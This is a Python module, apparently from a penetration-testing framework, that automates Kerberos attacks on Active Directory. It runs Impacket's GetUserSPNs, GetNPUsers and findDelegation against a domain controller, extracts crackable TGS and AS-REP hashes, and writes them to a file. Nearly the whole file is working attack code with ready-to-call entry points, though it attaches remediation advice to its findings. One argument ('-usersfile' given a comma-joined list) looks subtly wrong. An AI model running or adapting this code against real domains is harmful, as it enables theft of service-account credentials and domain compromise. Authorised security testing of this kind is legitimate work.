"""
Kerberos Attack Module

Implements common Kerberos-based attacks:
- Kerberoasting: Extract TGS tickets for service accounts
- AS-REP Roasting: Attack accounts without pre-auth
- Golden/Silver ticket detection
- Kerberos delegation abuse

Uses Impacket library for Kerberos operations.

Usage:
    from aipt_v2.tools.active_directory import KerberosAttacks

    attacker = KerberosAttacks(config)
    hashes = await attacker.kerberoast()
"""

import asyncio
import re
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import List, Dict, Any, Optional

from aipt_v2.core.event_loop_manager import current_time
from aipt_v2.tools.active_directory.ad_config import ADConfig, get_ad_config


@dataclass
class KerberosFinding:
    """Kerberos attack finding."""
    attack_type: str  # kerberoast, asreproast, delegation, ticket
    severity: str
    title: str
    description: str
    account: str
    hash_value: str = ""
    crackable: bool = False
    remediation: str = ""
    timestamp: str = ""

    def __post_init__(self):
        if not self.timestamp:
            self.timestamp = datetime.now(timezone.utc).isoformat()


@dataclass
class KerberosResult:
    """Result of Kerberos attacks."""
    domain: str
    status: str
    started_at: str
    finished_at: str
    duration: float
    kerberoast_hashes: List[str]
    asreproast_hashes: List[str]
    findings: List[KerberosFinding]
    metadata: Dict[str, Any] = field(default_factory=dict)


class KerberosAttacks:
    """
    Kerberos Attack Tool.

    Performs Kerberos-based attacks against Active Directory
    including Kerberoasting and AS-REP roasting.
    """

    def __init__(self, config: Optional[ADConfig] = None):
        """
        Initialize Kerberos attacker.

        Args:
            config: AD configuration
        """
        self.config = config or ADConfig()
        self.findings: List[KerberosFinding] = []
        self.kerberoast_hashes: List[str] = []
        self.asreproast_hashes: List[str] = []

    async def _run_impacket_tool(self, tool: str, args: List[str]) -> str:
        """Run Impacket tool and return output."""
        cmd = [tool] + args

        try:
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )

            stdout, stderr = await asyncio.wait_for(
                process.communicate(),
                timeout=self.config.timeout
            )

            return stdout.decode() + stderr.decode()

        except asyncio.TimeoutError:
            return ""
        except FileNotFoundError:
            return f"[!] Tool not found: {tool}"
        except Exception as e:
            return f"[!] Error: {e}"

    async def kerberoast(self, target_users: List[str] = None) -> List[str]:
        """
        Perform Kerberoasting attack.

        Extracts TGS tickets for service accounts that can be
        cracked offline to reveal passwords.

        Args:
            target_users: Specific users to target (optional)

        Returns:
            List of extracted hashes in hashcat format
        """
        hashes = []

        # Build GetUserSPNs command
        args = [
            f"{self.config.credentials.domain}/{self.config.credentials.username}",
            "-dc-ip", self.config.dc_ip,
            "-request"
        ]

        if self.config.credentials.password:
            args.extend(["-p", self.config.credentials.password])
        elif self.config.credentials.ntlm_hash:
            args.extend(["-hashes", self.config.credentials.ntlm_hash])

        if target_users:
            args.extend(["-usersfile", ",".join(target_users)])

        output = await self._run_impacket_tool("GetUserSPNs.py", args)

        # Parse TGS hashes from output
        # Format: $krb5tgs$23$*user$domain$SPN*$hash
        hash_pattern = r"\$krb5tgs\$[^\s]+"
        matches = re.findall(hash_pattern, output)

        for match in matches:
            hashes.append(match)

            # Extract username from hash
            user_match = re.search(r"\$krb5tgs\$\d+\$\*([^$]+)\$", match)
            username = user_match.group(1) if user_match else "unknown"

            self.findings.append(KerberosFinding(
                attack_type="kerberoast",
                severity="high",
                title=f"Kerberoastable Account: {username}",
                description=f"Extracted TGS ticket for {username}",
                account=username,
                hash_value=match[:100] + "...",
                crackable=True,
                remediation="Use strong passwords (25+ chars) for service accounts"
            ))

        self.kerberoast_hashes = hashes
        return hashes

    async def asreproast(self, target_users: List[str] = None) -> List[str]:
        """
        Perform AS-REP Roasting attack.

        Attacks accounts that don't require Kerberos pre-authentication.

        Args:
            target_users: Specific users to target (optional)

        Returns:
            List of extracted hashes
        """
        hashes = []

        # Build GetNPUsers command
        args = [
            f"{self.config.credentials.domain}/",
            "-dc-ip", self.config.dc_ip,
            "-request"
        ]

        # Can run without credentials to find vulnerable users
        if self.config.credentials.username:
            args[0] = f"{self.config.credentials.domain}/{self.config.credentials.username}"
            if self.config.credentials.password:
                args.extend(["-p", self.config.credentials.password])

        if target_users:
            args.extend(["-usersfile", ",".join(target_users)])
        else:
            args.append("-no-pass")

        output = await self._run_impacket_tool("GetNPUsers.py", args)

        # Parse AS-REP hashes
        # Format: $krb5asrep$23$user@domain:hash
        hash_pattern = r"\$krb5asrep\$[^\s]+"
        matches = re.findall(hash_pattern, output)

        for match in matches:
            hashes.append(match)

            # Extract username
            user_match = re.search(r"\$krb5asrep\$\d+\$([^@]+)@", match)
            username = user_match.group(1) if user_match else "unknown"

            self.findings.append(KerberosFinding(
                attack_type="asreproast",
                severity="high",
                title=f"AS-REP Roastable Account: {username}",
                description=f"Account {username} does not require pre-auth",
                account=username,
                hash_value=match[:100] + "...",
                crackable=True,
                remediation="Enable Kerberos pre-authentication for this account"
            ))

        self.asreproast_hashes = hashes
        return hashes

    async def check_delegation(self) -> List[KerberosFinding]:
        """
        Check for dangerous Kerberos delegation settings.

        Returns:
            List of delegation-related findings
        """
        findings = []

        # Use findDelegation.py from Impacket
        args = [
            f"{self.config.credentials.domain}/{self.config.credentials.username}",
            "-dc-ip", self.config.dc_ip
        ]

        if self.config.credentials.password:
            args.extend(["-p", self.config.credentials.password])
        elif self.config.credentials.ntlm_hash:
            args.extend(["-hashes", self.config.credentials.ntlm_hash])

        output = await self._run_impacket_tool("findDelegation.py", args)

        # Parse delegation output
        if "Unconstrained" in output:
            findings.append(KerberosFinding(
                attack_type="delegation",
                severity="critical",
                title="Unconstrained Delegation Found",
                description="Account with unconstrained delegation can impersonate any user",
                account="See output for details",
                remediation="Use constrained delegation or remove delegation rights"
            ))

        if "Constrained" in output:
            findings.append(KerberosFinding(
                attack_type="delegation",
                severity="high",
                title="Constrained Delegation Found",
                description="Account can delegate to specific services",
                account="See output for details",
                remediation="Review delegation targets and minimize scope"
            ))

        if "Resource-Based Constrained" in output or "RBCD" in output:
            findings.append(KerberosFinding(
                attack_type="delegation",
                severity="high",
                title="Resource-Based Constrained Delegation",
                description="RBCD configured - may be abusable",
                account="See output for details",
                remediation="Review msDS-AllowedToActOnBehalfOfOtherIdentity"
            ))

        self.findings.extend(findings)
        return findings

    async def enumerate_spns(self) -> List[Dict]:
        """
        Enumerate Service Principal Names.

        Returns:
            List of SPNs and associated accounts
        """
        spns = []

        args = [
            f"{self.config.credentials.domain}/{self.config.credentials.username}",
            "-dc-ip", self.config.dc_ip
        ]

        if self.config.credentials.password:
            args.extend(["-p", self.config.credentials.password])

        output = await self._run_impacket_tool("GetUserSPNs.py", args)

        # Parse SPN listing
        lines = output.split("\n")
        for line in lines:
            if "/" in line and not line.startswith("#") and not line.startswith("["):
                parts = line.split()
                if len(parts) >= 2:
                    spns.append({
                        "spn": parts[0] if "/" in parts[0] else parts[1],
                        "user": parts[0] if "/" not in parts[0] else "unknown"
                    })

        return spns

    def save_hashes(self, output_file: str) -> int:
        """
        Save extracted hashes to file.

        Args:
            output_file: Output file path

        Returns:
            Number of hashes saved
        """
        all_hashes = self.kerberoast_hashes + self.asreproast_hashes

        if not all_hashes:
            return 0

        output_path = Path(output_file)
        output_path.parent.mkdir(parents=True, exist_ok=True)

        with open(output_path, "w") as f:
            for hash_val in all_hashes:
                f.write(hash_val + "\n")

        return len(all_hashes)

    async def run_attacks(self) -> KerberosResult:
        """
        Run all Kerberos attacks.

        Returns:
            KerberosResult with findings
        """
        started_at = datetime.now(timezone.utc).isoformat()
        start_time = current_time()

        # Run attacks
        await self.kerberoast()
        await self.asreproast()
        await self.check_delegation()

        finished_at = datetime.now(timezone.utc).isoformat()
        duration = current_time() - start_time

        return KerberosResult(
            domain=self.config.domain,
            status="completed",
            started_at=started_at,
            finished_at=finished_at,
            duration=duration,
            kerberoast_hashes=self.kerberoast_hashes,
            asreproast_hashes=self.asreproast_hashes,
            findings=self.findings,
            metadata={
                "kerberoast_count": len(self.kerberoast_hashes),
                "asreproast_count": len(self.asreproast_hashes),
                "finding_count": len(self.findings)
            }
        )


# Convenience functions
async def run_kerberoast(
    domain: str,
    dc_ip: str,
    username: str,
    password: str,
    **kwargs
) -> List[str]:
    """
    Quick Kerberoasting attack.

    Args:
        domain: AD domain
        dc_ip: Domain Controller IP
        username: Username
        password: Password

    Returns:
        List of TGS hashes
    """
    config = get_ad_config(
        domain=domain,
        dc_ip=dc_ip,
        username=username,
        password=password
    )

    attacker = KerberosAttacks(config)
    return await attacker.kerberoast()


async def run_asreproast(
    domain: str,
    dc_ip: str,
    username: str = None,
    password: str = None,
    userlist: List[str] = None
) -> List[str]:
    """
    Quick AS-REP Roasting attack.

    Args:
        domain: AD domain
        dc_ip: Domain Controller IP
        username: Username (optional for unauthenticated)
        password: Password (optional)
        userlist: List of users to test

    Returns:
        List of AS-REP hashes
    """
    config = get_ad_config(
        domain=domain,
        dc_ip=dc_ip,
        username=username or "",
        password=password or ""
    )

    attacker = KerberosAttacks(config)
    return await attacker.asreproast(target_users=userlist)
